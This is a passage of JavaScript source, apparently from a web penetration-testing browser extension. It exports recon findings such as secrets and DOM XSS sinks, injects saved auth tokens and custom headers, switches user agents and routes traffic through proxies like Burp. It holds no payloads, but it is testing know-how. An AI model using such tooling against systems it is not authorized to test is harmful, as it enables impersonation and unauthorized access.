  $('recon-output').insertAdjacentHTML('afterbegin', bar);
}

// ─── Recon → Markdown ─────────────────────────────────────────────────────────

// Escape characters that break Markdown structure when they appear in data values.
function escMd(s) {
  return String(s ?? '')
    .replace(/\\/g, '\\\\')
    .replace(/\[/g, '\\[')
    .replace(/\]/g, '\\]')
    .replace(/\*/g, '\\*')
    .replace(/`/g, "'");
}

// Walk direct child nodes for generic items (forms, hidden fields, source scan text).
// Handles <b> → **bold**, strips buttons, escapes everything else.
function walkItemNodes(nodes) {
  const parts = [];
  nodes.forEach(node => {
    if (node.nodeType === Node.TEXT_NODE) {
      const t = escMd(node.textContent);
      if (t.trim()) parts.push(t);
    } else if (node.nodeType === Node.ELEMENT_NODE) {
      const tag = node.tagName.toLowerCase();
      const cls = node.className || '';
      if (tag === 'button' || cls.includes('recon-copy-btn')) return;
      if (tag === 'b' || tag === 'strong') {
        parts.push(`**${escMd(node.textContent.trim())}**`);
      } else if (tag === 'pre' || cls.includes('code-block')) {
        parts.push(`\n\`\`\`\n${node.textContent.trim()}\n\`\`\``);
      } else {
        const sub = walkItemNodes(node.childNodes);
        if (sub.trim()) parts.push(sub);
        if (['div', 'p'].includes(tag) && sub.trim()) parts.push('\n');
      }
    }
  });
  return parts.join('');
}

function sectionToMarkdown(section) {
  const h4 = section.querySelector(':scope > h4');
  const title = h4
    ? Array.from(h4.childNodes)
        .filter(n => !(n.nodeType === Node.ELEMENT_NODE && n.tagName === 'BUTTON'))
        .map(n => n.textContent).join('').trim()
    : (section.dataset.sectionName || '');

  const lines = [`## ${title}`, ''];

  const body = section.querySelector('.recon-section-body') || section;
  body.querySelectorAll('.recon-item').forEach(item => {
    // ── Category label (tech stack subcategories, secrets groupings) ──
    const cat = item.querySelector(':scope > .tech-cat-label');
    if (cat) lines.push(`### ${escMd(cat.textContent.trim())}`);

    // ── Response headers table ──
    const hdrTable = item.querySelector('.tech-hdr-table');
    if (hdrTable) {
      hdrTable.querySelectorAll('.tech-hdr-row').forEach(row => {
        const n = escMd(row.querySelector('.tech-hdr-name')?.textContent.trim() ?? '');
        const v = escMd(row.querySelector('.tech-hdr-value')?.textContent.trim() ?? '');
        lines.push(`- **${n}**: ${v}`);
      });
      lines.push('');
      return;
    }

    // ── Tech badges ──
    const techBadges = item.querySelector('.tech-badges');
    if (techBadges) {
      lines.push(Array.from(techBadges.querySelectorAll('.badge'))
        .map(b => escMd(b.textContent.trim())).join(', '));
      lines.push('');
      return;
    }

    // ── Secrets rows ──
    const secretsRows = item.querySelectorAll('.secrets-row');
    if (secretsRows.length) {
      secretsRows.forEach(row => {
        const match = row.querySelector('.secrets-match')?.getAttribute('title')
                   || row.querySelector('.secrets-match')?.textContent.trim() || '';
        const loc   = row.querySelector('.secrets-loc')?.textContent.trim() || '';
        lines.push(`- ${escMd(match)}${loc ? `  *(${escMd(loc)})*` : ''}`);
      });
      lines.push('');
      return;
    }

    // ── DOM XSS rows ──
    const domxssRows = item.querySelectorAll('.domxss-row');
    if (domxssRows.length) {
      domxssRows.forEach(row => {
        const sink     = row.querySelector('.domxss-sink,.domxss-sink-warn')?.textContent.trim() || '';
        const loc      = row.querySelector('.domxss-loc')?.textContent.trim() || '';
        const sources  = Array.from(row.querySelectorAll('.domxss-sources .badge'))
                           .map(b => escMd(b.textContent.trim()));
        const codeLine = row.querySelector('.domxss-line')?.textContent.trim() || '';
        lines.push(`- **${escMd(sink)}**${loc ? ` *(${escMd(loc)})*` : ''}`);
        if (sources.length) lines.push(`  - Sources: ${sources.join(', ')}`);
        if (codeLine) lines.push(`  - ${escMd(codeLine)}`);
      });
      lines.push('');
      return;
    }

    // ── Spider links ──
    const spiderLines = item.querySelectorAll('.recon-spider-line');
    if (spiderLines.length) {
      const group = item.querySelector('b')?.textContent.trim() || '';
      const count  = item.querySelector(':scope > .muted')?.textContent.trim() || '';
      if (group) lines.push(`**${escMd(group)}** ${escMd(count)}`.trim());
      const seen = new Set();
      item.querySelectorAll('.recon-spider-line').forEach(l => {
        const url = l.dataset.url || l.querySelector('.recon-spider-url')?.textContent.trim() || '';
        const loc = l.dataset.locations || '';
        if (!seen.has(url)) { seen.add(url); lines.push(`- ${escMd(url)}`); }
        if (loc) lines.push(`  - Found in: ${escMd(loc)}`);
      });
      lines.push('');
      return;
    }

    // ── Generic fallback (forms, hidden fields, source endpoints, etc.) ──
    const text = walkItemNodes(item.childNodes).trim();
    if (text) { lines.push(text); lines.push(''); }
  });

  return lines.join('\n').replace(/\n{3,}/g, '\n\n').trim();
}

function allReconToMarkdown() {
  const sections = Array.from($$('#recon-output .recon-section'));
  if (!sections.length) return '';
  return sections.map(sectionToMarkdown).join('\n\n---\n\n');
}

function reconToJson() {
  const sections = Array.from($$('#recon-output .recon-section')).map(section => ({
    name: section.dataset.sectionName || section.querySelector('h4')?.textContent.trim() || section.id,
    severity: section.dataset.severity || 'info',
    markdown: sectionToMarkdown(section),
  }));
  return {
    url: state.tabUrl,
    exportedAt: new Date().toISOString(),
    active: {
      roleId: state.activeRoleId,
    },
    sections,
  };
}

// ─── Auth ─────────────────────────────────────────────────────────────────────

const Auth = {
  async loadRoles() {
    const { roles = [], activeRoleId = null } = await chrome.storage.local.get(['roles', 'activeRoleId']);
    state.roles = roles;
    state.activeRoleId = activeRoleId;
    this.renderRoles();
  },

  async saveRole() {
    const name   = $('role-name').value.trim();
    const type   = $('role-type').value;
    const token  = $('role-token').value.trim();
    const hName  = $('role-header-name').value.trim();
    const cName  = $('role-cookie-name').value.trim();
    const domain = $('role-domain').value.trim();
    const subdomains = $('role-subdomain').checked;

    if (!name || !token) { toast('Name and token required', 'error'); return; }
    if (type === 'custom' && !hName) { toast('Header name required for custom', 'error'); return; }
    const payload = {
      name, type, token,
      headerName: type === 'custom' ? hName : null,
      cookieName: type === 'cookie' ? (cName || null) : null,
      domain: domain || null,
      subdomains,
    };
    if (state.roleEditId) {
      const i = state.roles.findIndex(r => r.id === state.roleEditId);
      if (i < 0) { toast('Role not found', 'error'); return; }
      const id = state.roles[i].id;
      state.roles[i] = { ...state.roles[i], ...payload, id };
    } else {
      state.roles.push({ id: Date.now(), ...payload });
    }
    await chrome.storage.local.set({ roles: state.roles });
    bg('SYNC_ROLE_MENUS');
    toast(state.roleEditId ? 'Role updated' : 'Role saved', 'success');
    this.cancelEdit();
    this.renderRoles();
  },

  startEdit(id) {
    const r = state.roles.find(x => x.id === id);
    if (!r) return;
    state.roleEditId = id;
    $('role-name').value = r.name;
    $('role-type').value = r.type;
    $('role-token').value = r.token;
    $('role-header-name').value = r.headerName || '';
    $('role-cookie-name').value = r.cookieName || '';
    $('role-domain').value = r.domain || '';
    $('role-subdomain').checked = r.subdomains !== false;
    const t = r.type;
    $('role-header-name').classList.toggle('hidden', t !== 'custom');
    $('role-cookie-name').classList.toggle('hidden', t !== 'cookie');
    $('role-save-btn').textContent = 'Update Role';
    $('role-edit-cancel').classList.remove('hidden');
    $('role-name').focus();
  },

  cancelEdit() {
    state.roleEditId = null;
    $('role-name').value = '';
    $('role-type').value = 'bearer';
    $('role-token').value = '';
    $('role-header-name').value = '';
    $('role-cookie-name').value = '';
    $('role-domain').value = '';
    $('role-subdomain').checked = true;
    $('role-header-name').classList.add('hidden');
    $('role-cookie-name').classList.add('hidden');
    $('role-save-btn').textContent = 'Save Role';
    $('role-edit-cancel').classList.add('hidden');
  },

  renderRoles() {
    const el = $('roles-list');
    if (!state.roles.length) { el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No roles saved</div>'; return; }
    el.innerHTML = state.roles.map(r => {
      const domainLabel = r.domain
        ? `${r.subdomains ? '*.' : ''}${esc(r.domain)}`
        : 'current site';
      return `
      <div class="role-row ${state.activeRoleId === r.id ? 'active-role' : ''}">
        <span class="role-name">${esc(r.name)}</span>
        <span class="role-type">${esc(r.type)}</span>
        <span class="role-domain-label" title="Domain scope">${domainLabel}</span>
        <button class="sm" data-action="edit-role" data-role-id="${r.id}" title="Edit" aria-label="Edit">Edit</button>
        <button class="sm primary" data-action="apply-role" data-role-id="${r.id}">Apply</button>
        <button class="sm" data-action="eject-role">Eject</button>
        <button class="sm danger" data-action="del-role" data-role-id="${r.id}">Delete</button>
      </div>`;
    }).join('');
  },

  async applyRole(id) {
    const role = state.roles.find(r => r.id === id);
    if (!role) return;

    const tabDomain = new URL(state.tabUrl).hostname;
    const domain = role.domain || tabDomain;

    if (role.type === 'cookie') {
      const cookieDomain = role.domain || tabDomain;
      const cname = role.cookieName || 'auth';
      const scheme = state.tabUrl.startsWith('https') ? 'https' : 'http';
      const { error } = await bg('REPLACE_NAMED_COOKIE', {
        forUrl: state.tabUrl,
        name: cname,
        cookie: buildCookieSetDetails({
          url: `${scheme}://${cookieDomain}/`,
          name: cname,
          value: role.token,
          domain: cookieDomain,
          path: '/',
        }),
      });
      if (error) { toast(`Cookie error: ${formatBgError(error)}`, 'error'); return; }
      toast(`Cookie set for ${role.name} to ${cookieDomain}`, 'success');
    } else {
      const headerMap = { bearer: 'Authorization', basic: 'Authorization', custom: role.headerName };
      const headerName = headerMap[role.type] || 'Authorization';
      const tokenVal   = role.type === 'bearer' ? `Bearer ${role.token}`
                       : role.type === 'basic'  ? `Basic ${role.token}`
                       : role.token;
      const { error } = await bg('INJECT_AUTH', { headerName, token: tokenVal, domain });
      if (error) { toast(`Inject error: ${error}`, 'error'); return; }
      const scopeLabel = role.subdomains ? `${domain} + subdomains` : domain;
      toast(`${role.name} applied - ${headerName} to ${scopeLabel}`, 'success');
    }
    state.activeRoleId = id;
    await chrome.storage.local.set({ activeRoleId: id });
    bg('SYNC_ROLE_MENUS');
    this.renderRoles();
    ActiveBar.update();
  },

  async ejectRole() {
    await bg('EJECT_AUTH');
    state.activeRoleId = null;
    await chrome.storage.local.remove('activeRoleId');
    bg('SYNC_ROLE_MENUS');
    toast('Auth ejected', 'success');
    this.renderRoles();
    ActiveBar.update();
  },

  async deleteRole(id) {
    if (state.roleEditId === id) this.cancelEdit();
    state.roles = state.roles.filter(r => r.id !== id);
    await chrome.storage.local.set({ roles: state.roles });
    if (state.activeRoleId === id) {
      state.activeRoleId = null;
      await chrome.storage.local.remove('activeRoleId');
    }
    bg('SYNC_ROLE_MENUS');
    this.renderRoles();
  },

  async clearRoles() {
    if (!state.roles.length) return;
    if (!confirm(`Delete all ${state.roles.length} saved roles?`)) return;
    this.cancelEdit();
    state.roles = [];
    state.activeRoleId = null;
    await chrome.storage.local.set({ roles: [] });
    await chrome.storage.local.remove('activeRoleId');
    await this.ejectRole();
    bg('SYNC_ROLE_MENUS');
    this.renderRoles();
  },

};

// ─── Header Profiles ─────────────────────────────────────────────────────────

const HeaderProfiles = {
  profiles: [],
  activeId: null,
  _formRows: [],

  addFormRow(name = '', value = '') {
    const idx = this._formRows.length;
    this._formRows.push({ name, value });
    const row = document.createElement('div');
    row.className = 'hprof-row';
    row.dataset.idx = idx;
    row.innerHTML = `
      <input class="hprof-hname" placeholder="Header name (e.g. X-Forwarded-For)" value="${esc(name)}" autocomplete="off">
      <input class="hprof-hvalue" placeholder="Value" value="${esc(value)}" autocomplete="off">
      <button class="sm danger hprof-remove" type="button" title="Remove">Delete</button>`;
    row.querySelector('.hprof-remove').addEventListener('click', () => {
      row.remove();
      this._formRows.splice(idx, 1);
    });
    $('hprof-rows').appendChild(row);
  },

  collectFormRows() {
    return Array.from($('hprof-rows').querySelectorAll('.hprof-row')).map(row => ({
      name:  row.querySelector('.hprof-hname').value.trim(),
      value: row.querySelector('.hprof-hvalue').value.trim(),
    })).filter(h => h.name);
  },

  async saveProfile() {
    const name    = $('hprof-name').value.trim();
    const domain  = $('hprof-domain').value.trim();
    const headers = this.collectFormRows();
    if (!name)          { toast('Profile name required', 'error'); return; }
    if (!headers.length){ toast('Add at least one header', 'error'); return; }
    this.profiles.push({ id: Date.now(), name, domain: domain || null, headers });
    await chrome.storage.local.set({ headerProfiles: this.profiles });
    $('hprof-name').value = '';
    $('hprof-domain').value = '';
    $('hprof-rows').innerHTML = '';
    this._formRows = [];
    bg('SYNC_ROLE_MENUS');
    toast('Header profile saved', 'success');
    this.renderProfiles();
  },

  async applyProfile(id) {
    const profile = this.profiles.find(p => p.id === id);
    if (!profile) return;
    const tabDomain = state.tabUrl ? new URL(state.tabUrl).hostname : '';
    const domain = profile.domain || tabDomain;
    if (!domain) { toast('No domain - navigate to a page first', 'error'); return; }
    const { error } = await bg('INJECT_HEADERS', { headers: profile.headers, domain });
    if (error) { toast(`Header inject error: ${error}`, 'error'); return; }
    this.activeId = id;
    await chrome.storage.local.set({ activeHeaderProfileId: id });
    bg('SYNC_ROLE_MENUS');
    toast(`${profile.name} applied to ${domain}`, 'success');
    this.renderProfiles();
    ActiveBar.update();
  },

  async ejectProfile() {
    await bg('EJECT_HEADERS');
    this.activeId = null;
    await chrome.storage.local.remove('activeHeaderProfileId');
    bg('SYNC_ROLE_MENUS');
    toast('Header injection ejected', 'success');
    this.renderProfiles();
    ActiveBar.update();
  },

  async deleteProfile(id) {
    this.profiles = this.profiles.filter(p => p.id !== id);
    await chrome.storage.local.set({ headerProfiles: this.profiles });
    if (this.activeId === id) {
      await bg('EJECT_HEADERS');
      this.activeId = null;
      await chrome.storage.local.remove('activeHeaderProfileId');
    }
    bg('SYNC_ROLE_MENUS');
    this.renderProfiles();
  },

  async loadProfiles() {
    const { headerProfiles = [], activeHeaderProfileId = null } =
      await chrome.storage.local.get(['headerProfiles', 'activeHeaderProfileId']);
    this.profiles = headerProfiles;
    this.activeId = activeHeaderProfileId;
    this.renderProfiles();
  },

  renderProfiles() {
    const el = $('hprof-list');
    if (!this.profiles.length) {
      el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No saved header profiles</div>';
      return;
    }
    el.innerHTML = this.profiles.map(p => {
      const detail = p.headers.map(h => `${h.name}: ${h.value}`).join(', ');
      const truncated = detail.length > 60 ? detail.slice(0, 57) + '…' : detail;
      const domainLabel = p.domain || 'current site';
      return `
        <div class="hprof-profile-row ${this.activeId === p.id ? 'active-hprof' : ''}">
          <span class="hpname">${esc(p.name)}</span>
          <span class="hpdetail" title="${esc(detail)}">${esc(truncated)} <span style="color:var(--yellow)">[${esc(domainLabel)}]</span></span>
          <button class="sm primary" data-action="hprof-apply" data-hpid="${p.id}">Apply</button>
          <button class="sm danger" data-action="hprof-del" data-hpid="${p.id}" title="Delete">Delete</button>
        </div>`;
    }).join('');
  },
};

// ─── Active State Bar (#11) ───────────────────────────────────────────────────

const UA_SHORT_NAMES = {
  'chrome-win':      'Chrome/Win',
  'chrome-mac':      'Chrome/Mac',
  'firefox-win':     'Firefox/Win',
  'safari-mac':      'Safari/Mac',
  'edge-win':        'Edge/Win',
  'curl':            'curl',
  'iphone-safari':   'Safari/iPhone',
  'iphone-chrome':   'Chrome/iPhone',
  'android-chrome':  'Chrome/Android',
  'samsung-browser': 'Samsung',
};

const ActiveBar = {
  async update() {
    const bar = $('active-bar');
    if (!bar) return;

    const {
      activeRoleId    = null,
      roles           = [],
      proxyMode       = 'direct',
      proxyProfileId  = null,
      proxyProfiles   = [],
      activeUA        = null,
      activeHeaderProfileId = null,
      headerProfiles  = [],
    } = await chrome.storage.local.get([
      'activeRoleId', 'roles', 'proxyMode', 'proxyProfileId', 'proxyProfiles',
      'activeUA', 'activeHeaderProfileId', 'headerProfiles',
    ]);

    const chips = [];

    // Role chip
    if (activeRoleId) {
      const role = roles.find(r => r.id === activeRoleId);
      if (role) chips.push(`<span class="abar-chip abar-role" data-section="profiles-roles">👤 ${esc(role.name)}</span>`);
    }

    // Proxy chip
    if (proxyMode && proxyMode !== 'direct') {
      let label = proxyMode;
      if (proxyMode === 'profile' && proxyProfileId) {
        const pp = proxyProfiles.find(p => p.id === proxyProfileId);
        if (pp) label = pp.name;
      }
      chips.push(`<span class="abar-chip abar-proxy" data-section="profiles-proxy">⬡ ${esc(label)}</span>`);
    }

    // UA chip
    if (activeUA) {
      const matchKey = Object.entries(UA_PRESETS).find(([, v]) => v === activeUA)?.[0];
      const short = matchKey ? (UA_SHORT_NAMES[matchKey] || matchKey) : activeUA.substring(0, 22) + '…';
      chips.push(`<span class="abar-chip abar-ua" data-section="profiles-ua">🕵 ${esc(short)}</span>`);
    }

    // Header profile chip
    if (activeHeaderProfileId) {
      const hp = headerProfiles.find(p => p.id === activeHeaderProfileId);
      if (hp) chips.push(`<span class="abar-chip abar-headers" data-section="profiles-headers">⊕ ${esc(hp.name)}</span>`);
    }

    if (chips.length) {
      bar.innerHTML = chips.join('');
      bar.classList.remove('empty');
    } else {
      bar.innerHTML = '';
      bar.classList.add('empty');
    }

    // Dot indicator on sidebar Profiles button
    const dot = $('profiles-active-dot');
    if (dot) dot.classList.toggle('visible', chips.length > 0);
  },
};

// ─── User-Agent Switcher ──────────────────────────────────────────────────────

const UA_RULE_ID = 2;

const UA_PRESETS = {
  'chrome-win':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.116 Safari/537.36',
  'chrome-mac':       'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.117 Safari/537.36',
  'firefox-win':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0',
  'safari-mac':       'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.4 Safari/605.1.15',
  'edge-win':         'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.116 Safari/537.36 Edg/147.0.7727.116',
  'curl':             'curl/8.13.0',
  'iphone-safari':    'Mozilla/5.0 (iPhone; CPU iPhone OS 26_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.4 Mobile/15E148 Safari/604.1',
  'iphone-chrome':    'Mozilla/5.0 (iPhone; CPU iPhone OS 26_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/147.0.7727.116 Mobile/15E148 Safari/604.1',
  'android-chrome':   'Mozilla/5.0 (Linux; Android 16; Pixel 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.7727.116 Mobile Safari/537.36',
  'samsung-browser':  'Mozilla/5.0 (Linux; Android 16; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/147.0.7727.116 Mobile Safari/537.36',
};

const UserAgent = {
  profiles: [],

  async getActiveUA() {
    const { activeUA = null } = await chrome.storage.local.get(['activeUA']);
    return activeUA;
  },

  async apply() {
    const preset = $('ua-preset').value;
    const custom = $('ua-custom').value.trim();
    const ua = custom || UA_PRESETS[preset];
    if (!ua) { toast('Select a preset or enter a custom UA', 'error'); return; }

    const { error } = await bg('SET_UA', { ua });
    if (error) { toast(`UA error: ${error}`, 'error'); return; }
    await chrome.storage.local.set({ activeUA: ua });
    bg('SYNC_ROLE_MENUS');
    toast('User-Agent applied', 'success');
    this.showStatus(ua);
    this.renderProfiles();
    ActiveBar.update();
  },

  async reset() {
    const { error } = await bg('CLEAR_UA');
    if (error) { toast(`UA error: ${error}`, 'error'); return; }
    await chrome.storage.local.remove('activeUA');
    bg('SYNC_ROLE_MENUS');
    $('ua-preset').value = '';
    $('ua-custom').value = '';
    $('ua-status').textContent = '';
    $('ua-status').classList.remove('active');
    toast('User-Agent reset to default', 'success');
    this.renderProfiles();
    ActiveBar.update();
  },

  showStatus(ua) {
    const el = $('ua-status');
    el.textContent = ua;
    el.classList.add('active');
  },

  async loadSaved() {
    const { activeUA } = await chrome.storage.local.get('activeUA');
    if (activeUA) {
      this.showStatus(activeUA);
      const match = Object.entries(UA_PRESETS).find(([, v]) => v === activeUA);
      if (match) $('ua-preset').value = match[0];
      else $('ua-custom').value = activeUA;
    }
  },

  async saveProfile() {
    const name = $('ua-profile-name').value.trim();
    const ua = $('ua-custom').value.trim() || UA_PRESETS[$('ua-preset').value] || '';
    if (!name || !ua) {
      toast('Profile name and UA value required', 'error');
      return;
    }
    this.profiles.push({ id: Date.now(), name, ua });
    await chrome.storage.local.set({ uaProfiles: this.profiles });
    $('ua-profile-name').value = '';
    bg('SYNC_ROLE_MENUS');
    toast('UA profile saved', 'success');
    this.renderProfiles();
  },

  async deleteProfile(id) {
    this.profiles = this.profiles.filter(p => p.id !== id);
    await chrome.storage.local.set({ uaProfiles: this.profiles });
    bg('SYNC_ROLE_MENUS');
    toast('UA profile deleted', 'success');
    this.renderProfiles();
  },

  async applyProfile(id) {
    const profile = this.profiles.find(p => p.id === id);
    if (!profile) return;
    const { error } = await bg('SET_UA', { ua: profile.ua });
    if (error) { toast(`UA error: ${error}`, 'error'); return; }
    await chrome.storage.local.set({ activeUA: profile.ua });
    $('ua-custom').value = profile.ua;
    $('ua-preset').value = '';
    this.showStatus(profile.ua);
    bg('SYNC_ROLE_MENUS');
    toast(`UA profile applied: ${profile.name}`, 'success');
    this.renderProfiles();
    ActiveBar.update();
  },

  async loadProfiles() {
    const { uaProfiles = [] } = await chrome.storage.local.get(['uaProfiles']);
    this.profiles = uaProfiles;
    this.renderProfiles();
  },

  async renderProfiles() {
    const el = $('ua-profiles-list');
    if (!this.profiles.length) {
      el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No saved UA profiles</div>';
      return;
    }
    const activeUA = await this.getActiveUA();
    el.innerHTML = this.profiles.map(p => `
      <div class="ua-profile-row ${activeUA && activeUA === p.ua ? 'active-ua' : ''}">
        <span class="uname">${esc(p.name)}</span>
        <span class="udetail" title="${esc(p.ua)}">${esc(p.ua)}</span>
        <button class="sm primary" data-action="ua-apply" data-uaid="${p.id}">Apply</button>
        <button class="sm danger" data-action="ua-del" data-uaid="${p.id}" title="Delete" aria-label="Delete">Delete</button>
      </div>
    `).join('');
  },
};

// ─── Proxy ────────────────────────────────────────────────────────────────────

const PROXY_PRESETS = {
  direct: null,
  system: null,
  burp:   { host: '127.0.0.1', port: 8080, scheme: 'http' },
};

const Proxy = {
  profiles: [],
  activeMode: 'direct',
  activeProfileId: null,

  buildFixedConfig(scheme, host, port) {
    return {
      mode: 'fixed_servers',
      rules: { singleProxy: { scheme, host, port: parseInt(port, 10) } },
    };
  },

  buildPacConfig(scheme, host, port, includes, excludes) {
    const proxyStr = scheme === 'socks4' || scheme === 'socks5'
      ? `SOCKS5 ${host}:${port}; SOCKS ${host}:${port}`
      : `PROXY ${host}:${port}`;

    const conditions = [];
    if (excludes.length) {
      excludes.forEach(p => {
        conditions.push(`if (shExpMatch(host, ${JSON.stringify(p)})) return "DIRECT";`);
      });
    }
    if (includes.length) {
      const checks = includes.map(p => `shExpMatch(host, ${JSON.stringify(p)})`).join(' || ');
      conditions.push(`if (${checks}) return "${proxyStr}";`);
      conditions.push(`return "DIRECT";`);
    } else {
      conditions.push(`return "${proxyStr}";`);
    }

    const script = `function FindProxyForURL(url, host) {\n  ${conditions.join('\n  ')}\n}`;
    return { mode: 'pac_script', pacScript: { data: script } };
  },

  async applyPreset(mode) {
    this.activeProfileId = null;

    if (mode === 'direct') {
      await bg('CLEAR_PROXY');
    } else if (mode === 'system') {
      await bg('SET_PROXY', { config: { mode: 'system' } });
    } else {
      const p = PROXY_PRESETS[mode];
      const config = this.buildFixedConfig(p.scheme, p.host, p.port);
      const { error } = await bg('SET_PROXY', { config });
      if (error) { toast(`Proxy error: ${error}`, 'error'); return; }
    }

    this.activeMode = mode;
    await this.persist();
    this.updateUI();
    bg('SYNC_ROLE_MENUS');
    toast(`Proxy: ${mode}`, 'success');
    ActiveBar.update();
  },

  async applyProfile(id) {
    const profile = this.profiles.find(p => p.id === id);
    if (!profile) return;

    const includes = (profile.include || '').split(',').map(s => s.trim()).filter(Boolean);
    const excludes = (profile.exclude || '').split(',').map(s => s.trim()).filter(Boolean);

    let config;
    if (includes.length || excludes.length) {
      config = this.buildPacConfig(profile.scheme, profile.host, profile.port, includes, excludes);
    } else {
      config = this.buildFixedConfig(profile.scheme, profile.host, profile.port);
    }

    const { error } = await bg('SET_PROXY', { config });
    if (error) { toast(`Proxy error: ${error}`, 'error'); return; }

    this.activeMode = 'profile';
    this.activeProfileId = id;
    await this.persist();
    this.updateUI();
    bg('SYNC_ROLE_MENUS');
    toast(`Proxy: ${profile.name}`, 'success');
    ActiveBar.update();
  },

  async saveProfile() {
    const name    = $('proxy-profile-name').value.trim();
    const scheme  = $('proxy-type').value;
    const host    = $('proxy-host').value.trim();
    const port    = $('proxy-port').value.trim();
    const include = $('proxy-include').value.trim();
    const exclude = $('proxy-exclude').value.trim();

    if (!name || !host || !port) { toast('Name, host, and port required', 'error'); return; }

    this.profiles.push({ id: Date.now(), name, scheme, host, port, include, exclude });
    await chrome.storage.local.set({ proxyProfiles: this.profiles });
    $('proxy-profile-name').value = '';
    $('proxy-host').value = '';
    $('proxy-port').value = '';
    $('proxy-include').value = '';
    $('proxy-exclude').value = '';
    toast('Profile saved', 'success');
    this.renderProfiles();
  },

  async deleteProfile(id) {
    this.profiles = this.profiles.filter(p => p.id !== id);
    await chrome.storage.local.set({ proxyProfiles: this.profiles });
    if (this.activeProfileId === id) {
      await this.applyPreset('direct');
    }
    this.renderProfiles();
  },

  renderProfiles() {
    const el = $('proxy-profiles-list');
    if (!this.profiles.length) {
      el.innerHTML = '<div class="muted" style="font-size:11px;padding:6px 0">No saved profiles</div>';
      return;
    }
    el.innerHTML = this.profiles.map(p => `
      <div class="proxy-profile-row ${this.activeProfileId === p.id ? 'active-proxy' : ''}">
        <span class="pname">${esc(p.name)}</span>
        <span class="pdetail">${esc(p.scheme)}://${esc(p.host)}:${esc(p.port)}</span>
        <button class="sm primary" data-action="proxy-apply" data-pid="${p.id}">Apply</button>
        <button class="sm danger" data-action="proxy-del" data-pid="${p.id}" title="Delete" aria-label="Delete">Delete</button>
      </div>`
    ).join('');
  },

  updateUI() {
    const bar   = $('proxy-status-bar');
    const icon  = $('proxy-status-icon');
    const text  = $('proxy-status-text');

    $$('.proxy-quick').forEach(b => b.classList.remove('active'));

    if (this.activeMode === 'direct') {
      bar.className = 'proxy-status off';
      icon.className = 'status-dot off';
      text.textContent = 'Direct (no proxy)';
      $('proxy-direct').classList.add('active');
    } else if (this.activeMode === 'system') {
      bar.className = 'proxy-status on';
      icon.className = 'status-dot on';
      text.textContent = 'Using system proxy';
      $('proxy-system').classList.add('active');
    } else if (this.activeMode === 'profile') {
      const p = this.profiles.find(pr => pr.id === this.activeProfileId);
      bar.className = 'proxy-status on';
      icon.className = 'status-dot on';
      text.textContent = p ? `${p.name} - ${p.scheme}://${p.host}:${p.port}` : 'Custom profile';
    } else {
      const preset = PROXY_PRESETS[this.activeMode];
      bar.className = 'proxy-status on';
      icon.className = 'status-dot on';
      text.textContent = `${this.activeMode} - ${preset.host}:${preset.port}`;
      $(`proxy-${this.activeMode}`)?.classList.add('active');
    }

    this.renderProfiles();
  },

  async persist() {
    await chrome.storage.local.set({
      proxyMode: this.activeMode,
      proxyProfileId: this.activeProfileId,
    });
  },

  async loadSaved() {
    const { proxyProfiles = [], proxyMode = 'direct', proxyProfileId = null } =
      await chrome.storage.local.get(['proxyProfiles', 'proxyMode', 'proxyProfileId']);
    this.profiles = proxyProfiles;
    this.activeMode = proxyMode;
    this.activeProfileId = proxyProfileId;
    this.updateUI();
  },
};

// ─── Encode / Decode ─────────────────────────────────────────────────────────

const Encode = {
  encode(type, input) {
    switch (type) {
      case 'base64':    return btoa(unescape(encodeURIComponent(input)));
      case 'base64url': return btoa(unescape(encodeURIComponent(input))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
      case 'url':       return encodeURIComponent(input);
      case 'url-full':  return [...input].map(c => '%' + c.charCodeAt(0).toString(16).padStart(2,'0').toUpperCase()).join('');
      case 'html':      return input.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');
      case 'hex':       return [...unescape(encodeURIComponent(input))].map(c => c.charCodeAt(0).toString(16).padStart(2,'0')).join('');
      case 'unicode':   return [...input].map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4,'0')}`).join('');
      default: return input;
    }
  },

  decode(type, input) {
    try {
      switch (type) {
        case 'base64':
        case 'base64url': {
          const s = input.replace(/-/g,'+').replace(/_/g,'/') + '==='.slice((input.length+3)%4);
          return decodeURIComponent(escape(atob(s)));
        }
        case 'url':     return decodeURIComponent(input.replace(/\+/g,' '));
        case 'url-full':return decodeURIComponent(input);
        case 'html':    return input.replace(/&amp;/g,'&').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&quot;/g,'"').replace(/&#x27;/g,"'").replace(/&#(\d+);/g,(_,n)=>String.fromCharCode(+n)).replace(/&#x([0-9a-f]+);/gi,(_,h)=>String.fromCharCode(parseInt(h,16)));
        case 'hex':     return decodeURIComponent(input.replace(/[0-9a-f]{2}/gi, '%$&'));
        case 'unicode': return input.replace(/\\u([0-9a-f]{4})/gi, (_,h) => String.fromCharCode(parseInt(h,16)));
        default: return input;
      }
    } catch (e) {
      return `[Error: ${e.message}]`;
    }
  },
};

// ─── Timestamp ────────────────────────────────────────────────────────────────

const Timestamp = {
  parse(input) {
    const s = input.trim();
    if (!s) return null;
    if (/^\d+$/.test(s)) {
      const n = Number(s);
      return new Date(s.length >= 12 ? n : n * 1000);
    }
    const d = new Date(s);
    return isNaN(d) ? null : d;
  },

  render(d) {
    const out = $('ts-output');
    if (!d) {
      out.innerHTML = '<div class="ts-error">Could not parse — try a Unix timestamp or ISO date string</div>';
      return;
    }
